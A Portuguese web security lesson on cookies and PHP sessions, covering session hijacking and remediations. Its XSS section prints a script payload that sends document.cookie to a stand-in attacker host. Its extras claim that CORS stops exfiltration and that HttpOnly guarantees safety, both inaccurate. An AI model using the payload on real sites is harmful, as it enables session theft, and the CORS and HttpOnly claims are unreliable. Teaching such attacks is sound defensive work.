# Cookies e sessões

## Cookies

_Cookies_ são pequenos fragmentos de informação que um site pode armazenar no computador do usuário para uso posterior. Eles são muito úteis uma vez que o protocolo HTTP não apresenta nenhum meio de tornar as informações de uma conexão persistentes. Se dependêssemos apenas das conexões HTTP, seria impossível, por exemplo, usar um carrinho de compras, pois ao trocar para a página de compra as informações seriam perdidas.

Em um site de jogos de navegador, é muito comum que o progresso do jogo seja salvo em _cookies_, no navegador. Os _cookies_ também são bastante usados para armazenar configurações do cliente, como volume do _player_ de música, cor do fundo do site etc.

Geralmente, os navegadores limitam o tamanho que um _cookie_ pode ter para 4KB, além de apagar _cookies_ que já tiveram sua validade vencida.

Exemplo de _cookie_ feito em PHP:

```php
<?php
    // cookies.php

    if (isset($_COOKIE['cookie_teste'])) {
        echo 'Você JÁ passou por aqui!';
    } else {
        echo 'Você NUNCA passou por aqui.'; 
        //Pode ser que você tenha passado há uma hora, mas o servidor não tem como saber
        setcookie('cookie_teste', 'Algum valor...', time() + 3600);
    }
?>
```

Retirado de [https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html](https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html).

Esse código implementa um conceito similar à sessão \(mas ainda não é uma\). Nesse caso, um certo conteúdo pode ser exibido de acordo com o intervalo de tempo desde a última visita. O _cookie_ no código possui uma hora de "vida" \(3600 segundos\).

Um _cookie_ é de acesso limitado ao site que o criou, de modo a garantir que um site mal intencionado não roube os _cookies_ que o site do seu banco armazenou no seu computador por exemplo.

## Sessões

Agora, vamos ao que, no momento, mais nos interessa. **Os** _**cookies**_ **podem ser usados como forma de autenticação**, geralmente armazenando o id de uma **sessão**. É devido às sessões que é possível logar automaticamente em redes sociais - sem precisar entrar com suas credenciais - por muito tempo. Quando o usuário conecta-se, uma sessão é iniciada e o id dessa sessão é salvo em um _cookie_ em seu computador. Este será usado mais tarde para informar ao servidor que o usuário já possui um sessão ativa \(e, portanto, não é preciso entrar com usuário e senha novamente\). A maioria dos sites que implementam esse recurso estabelecem uma data de expiração da sessão, de modo a invalidar o id salvo no _cookie_.

A grande diferença aqui é que **a sessão é armazenada no servidor**, enquanto **o** _**cookie**_ **é armazenado localmente**.

Exemplo de sessão em PHP:

```php
<?php
    // sessions.php

    session_start();

    if (isset($_SESSION['usuario'])) {
        echo "Bem vindo {$_SESSION['usuario']}!";
    } else {
        echo 'Você NUNCA passou por aqui.';
        $_SESSION['usuario'] = 'João';
    }
?>
```

Retirado de [https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html](https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html)

## Falhas

### Uso inocente de _cookies_

É necessário saber como usar os _cookies_. Um exemplo exagerado de mau uso seria um site que lê e salva um _cookie_ `admin=1` para admins e `admin=0` para usuários normais. Na primeira conexão, o _cookie_ não existe, então o site manda o _browser_ salvar `admin=0`. Quando o usuário entra com uma conta de administrador, o site manda o _browser_ mudar o _cookie_ para `admin=1` e o site exibe conteúdo que não era visível. Lindo, não? O problema com essa forma de autenticação é que bastaria o usuário editar o próprio _cookie_ e alterar o conteúdo \(de `admin=0` para `admin=1`\) para se tornar administrador do site, burlando todo o "sistema de segurança".

### Session Hijacking \(Sequestro de Sessão\)

Certo, essa foi uma falha bem besta, mas e se em vez de `admin=0`, o _cookie_ fosse `PHPSESSID=somesessionid` - um _cookie_ identificador de uma sessão legítima?

Basta alguém conseguir ler esse _cookie_ para ter acesso à conta atrelada à sessão. Esse ataque é chamado de **Session Hijacking** \(Sequestro de Sessão\).

Não há como evitar que alguém com acesso físico ao seu computador \(com o navegador aberto na página\) obtenha sua sessão, mas se isso ocorreu ele já tem muito mais "poder" sobre seus dados e sessões.

O que é possível é evitar que pessoas mal intencionadas obtenham sua sessão por meio de outros ataques, como **XSS \(Cross-Site-script\)** e **MITM \(Man-In-The-Middle**\). O segundo ataque caracteriza-se, basicamente, por haver um atacante entrando no meio de uma conexão não encriptada \(HTTP\) e lendo todo o tráfego entre a vítima e o site, incluindo os _cookies_ enviados e a sessão. Já o primeiro ataque resume-se no atacante injetar código na página de alguma forma. Esse código injetado pode, em certos casos, ler, modificar e até enviar o conteúdo dos _cookies_ armazenados para algum outro servidor. \([Ler mais sobre XSS](xss.md)\)

#### Exemplo de Session Hijacking por meio de XSS

```markup
<script type="text/javascript">
    new Image().src="http://www.sitedoatacante.com.br/cookies.php?c="+encodeURI(document.cookie);
</script>
```

Fonte: [http://www.douglaspasqua.com/2012/01/14/seguranca-cookies-httponly/](http://www.douglaspasqua.com/2012/01/14/seguranca-cookies-httponly/)

Esse script colocado pelo atacante na página adiciona uma "imagem" na página. O navegador acessa o link indicado para baixar a imagem, mas no link é passado o cookie como parâmetro e o atacante usa um _script_ no site dele para salvar o _cookie_ que possui a sessão. Pronto, agora ele pode entrar na conta e fazer o que quiser! É por essa e por outras que alguns sites pedem para o usuário digitar novamente a senha ao alterar informações sensíveis da conta, como e-mail de recuperação e senha.

## Remediações

* Ataque XSS: definir os _cookies_ com a política HTTP-Only \(Leia abaixo\)
* Ataque MITM: criptografar a conexão, usando HTTPS \([Ler Mais](protocolo_https.md)\)

## Extras

### HTTP-ONLY

É sempre bom evitar brechas para ataques XSS, logo uma camada extra de proteção nunca é de mais. Um _cookie_ do tipo HTTP-Only não pode ser modificado por meio de código Javascript, seja ele legítimo \(da página original\) ou injetado.

Dessa forma, é garantido que não haverá qualquer possibilidade de um _cookie_ ser roubado por meio de injeção de código \(XSS\).

Como definir um _cookie_ como HTTP-Only em PHP:

```php
//Template:
//setcookie ($name, $value, $expire, $path, $domain, $secure, $httponly);

//Definindo de fato:
setcookie("TesteCookie", "123456", 0, "/", "example.com", false, true);

//Ou, se preferir definir direto no header da response:
header("Set-Cookie: nome=valor; path=/; httpOnly" );
//É desse jeito que os cookies aparecem para o atacante que observa as respostas do servidor

//Por padrão, ao criar uma sessão no PHP, é criado um cookie usado para
//controlar o acesso do usuário na sessão. Normalmente o cookie é chamado
//PHPSESSID. Na configuração padrão esse cookie não é httpOlny. Para ativar o
//parâmetro httpOnly no cookie de sessão do PHP, setar a diretiva
//session.cookie_httponly no php.ini para true:
session.cookie_httponly = true
```

Fonte: [http://www.douglaspasqua.com/2012/01/14/seguranca-cookies-httponly/](http://www.douglaspasqua.com/2012/01/14/seguranca-cookies-httponly/)

### CSP e CORS

CSP - Content Security Policy - é um _header_ na conexão HTTP ou HTTPS que indica ao navegador diversas medidas de segurança, visando à blindagem contra XSS.

CORS - Cross-Origin Resource Sharing - é um _header_ que o site passa para o navegador, dizendo com quais sites ele pode se conectar por meio da página atual. Esse recurso evita que XSS consiga enviar o _cookie_ roubado para o site do atacante \(ainda é possível burlar isso com callbacks em alguns casos\).

[Leia mais na aula de XSS](xss.md)

## Leia Mais

[https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html](https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html)  [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)  [https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)  [https://developer.mozilla.org/en-US/docs/Tools](https://developer.mozilla.org/en-US/docs/Tools)

